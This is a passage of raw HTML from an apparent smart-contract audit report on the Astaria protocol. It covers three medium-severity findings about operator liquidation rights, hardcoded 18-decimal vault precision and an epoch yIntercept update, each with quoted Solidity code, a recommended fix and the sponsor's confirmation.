9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add ability for approved operators to call functions that can be called by the collateral token owner.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/134\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-27-approved-operator-of-collateral-owner-cant-liquidate-lien\" style=\"position:relative;\"><a href=\"#m-27-approved-operator-of-collateral-owner-cant-liquidate-lien\" aria-label=\"m 27 approved operator of collateral owner cant liquidate lien permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/133\">[M-27] Approved operator of collateral owner can’t liquidate lien</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/133\">rvierdiiev</a></em></p>\n<p>If someone wants to liquidate lien then <code>canLiquidate</code> function <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L625-L627\">is called</a> to check if it’s possible.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L611-L619\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L611-L619</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"soldiity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function canLiquidate(ILienToken.Stack memory stack)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    public</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    view</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    returns (bool)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    RouterStorage storage s = _loadRouterSlot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return (stack.point.end &lt;= block.timestamp ||</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      msg.sender == s.COLLATERAL_TOKEN.ownerOf(stack.lien.collateralId));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>As you can see owner of collateral token can liquidate lien in any moment.<br>\nHowever approved operators of owner can’t do that, however they should.</p>\n<p>As while validating commitment it’s allowed for approved operator <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L237-L244\">to request a loan</a>.</p>\n<p>That means that owner of collateral token can approve some operators to allow them to work with their debts.</p>\n<p>So they should be able to liquidate loan as well.</p>\n<h3 id=\"tools-used-13\" style=\"position:relative;\"><a href=\"#tools-used-13\" aria-label=\"tools used 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VsCode</p>\n<h3 id=\"recommended-mitigation-steps-43\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-43\" aria-label=\"recommended mitigation steps 43 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add ability for approved operators to liqiudate lien.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/133\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-28-lack-of-support-for-erc20-token-that-is-not-18-decimals\" style=\"position:relative;\"><a href=\"#m-28-lack-of-support-for-erc20-token-that-is-not-18-decimals\" aria-label=\"m 28 lack of support for erc20 token that is not 18 decimals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/129\">[M-28] Lack of support for ERC20 token that is not 18 decimals</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/129\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/156\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L66\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L66</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L73\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L73</a></p>\n<p>Lack of support for ERC20 token that is not 18 decimals in PublicVault.sol.</p>\n<h3 id=\"proof-of-concept-44\" style=\"position:relative;\"><a href=\"#proof-of-concept-44\" aria-label=\"proof of concept 44 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>We need to look into the PublicVault.sol implementation</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IPublicVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ERC4626Cloned</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>the issue that is the decimal precision in the PublicVault is hardcoded to 18</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"103\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">pure</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20Metadata</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint8</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>According to</p>\n<p><a href=\"https://eips.ethereum.org/EIPS/eip-4626\">https://eips.ethereum.org/EIPS/eip-4626</a></p>\n<blockquote>\n<p>Although the convertTo functions should eliminate the need for any use of an EIP-4626 Vault’s decimals variable, it is still strongly recommended to mirror the underlying token’s decimals if at all possible, to eliminate possible sources of confusion and simplify integration across front-ends and for other off-chain users.</p>\n</blockquote>\n<p>The solmate ERC4626 implementation did mirror the underlying token decimals</p>\n<p><a href=\"https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L38\">https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L38</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"104\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_name</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_symbol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_symbol</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">asset</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>but the token decimals is over-written to 18 decimals.</p>\n<p><a href=\"https://github.com/d-xo/weird-erc20#low-decimals\">https://github.com/d-xo/weird-erc20#low-decimals</a></p>\n<p>Some tokens have low decimals (e.g. USDC has 6). Even more extreme, some tokens like Gemini USD only have 2 decimals.</p>\n<p>For example, if the underlying token is USDC and has 6 decimals, the convertToAssets() function will be broken.</p>\n<p><a href=\"https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L130\">https://github.com/transmissions11/solmate/blob/3998897acb502fa7b480f505138a6ae1842e8d10/src/mixins/ERC4626.sol#L130</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">convertToAssets</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Saves an extra SLOAD if totalSupply is non-zero.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The totalSupply is in 18 deimals, but the totalAssets is in 6 deciimals, but the totalSupply should be 6 decimals as well to match the underlying token precision.</p>\n<p>There are place that the code assume the token is 18 decimals, if the token is not 18 decimals, the logic for liquidatoin ratio calculation is broken as well because the hardcoded 1e18 is used.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proxySupply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setWithdrawRatio</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expected</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentWithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExpected</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t.</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_setYIntercept</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yIntercept</span><span class=\"mtk1\"> -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">().</span><span class=\"mtk11\">mulDivDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>And in the claim function for WithdrawProxy.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">decreaseYIntercept</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">VAULT</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">increaseYIntercept</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expected</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-44\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-44\" aria-label=\"recommended mitigation steps 44 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol make the PublicVault.sol decimal match the underlying token decimals.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/129\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-29-publicvaultprocessepoch-updates-yintercept-incorrectly-when-totalassets--expected\" style=\"position:relative;\"><a href=\"#m-29-publicvaultprocessepoch-updates-yintercept-incorrectly-when-totalassets--expected\" aria-label=\"m 29 publicvaultprocessepoch updates yintercept incorrectly when totalassets  expected permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/124\">[M-29] <code>PublicVault.processEpoch</code> updates <code>YIntercept</code> incorrectly when <code>totalAssets() &#x3C;= expected</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/124\">rvierdiiev</a></em></p>\n<p>When <code>processEpoch</code> is called it calculates amount of <code>withdrawReserve</code> that will be sent to the withdraw proxy. Later it updates <code>yIntercept</code> variable.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L275-L337\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L275-L337</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">processEpoch</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// check to make sure epoch is over</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">timeToEpochEnd</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">EPOCH_NOT_OVER</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadStorageSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">WITHDRAW_RESERVE_NOT_ZERO</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 